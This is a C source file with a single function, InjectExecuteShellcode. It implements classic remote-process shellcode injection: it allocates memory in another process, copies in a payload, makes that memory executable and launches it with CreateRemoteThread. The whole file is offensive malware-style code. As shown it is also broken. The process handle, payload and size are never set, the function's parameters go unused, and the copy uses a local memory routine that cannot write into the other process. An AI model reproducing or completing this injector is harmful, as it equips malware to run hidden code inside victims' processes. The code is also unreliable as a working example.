#include "crt.h"
#include "mem.h"

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#endif
#include <stdio.h>

int InjectExecuteShellcode(InjectData* injectorData, Injector* injector)
{
    void* exec_mem    = NULL;
    HANDLE hThread    = NULL;
    HANDLE hProcess   = NULL;
    DWORD old_protect = 0;
    BOOL bSuccess     = 0;
    char* payload     = 0;
    size_t size       = 0;

    exec_mem = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    RtlMoveMemory(exec_mem, payload, size);
    bSuccess = VirtualProtectEx(hProcess, exec_mem, size, PAGE_EXECUTE_READ, &old_protect);

    if (bSuccess)
    {
        hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
        WaitForSingleObject(hThread, INFINITE);
    }

    return bSuccess;
}
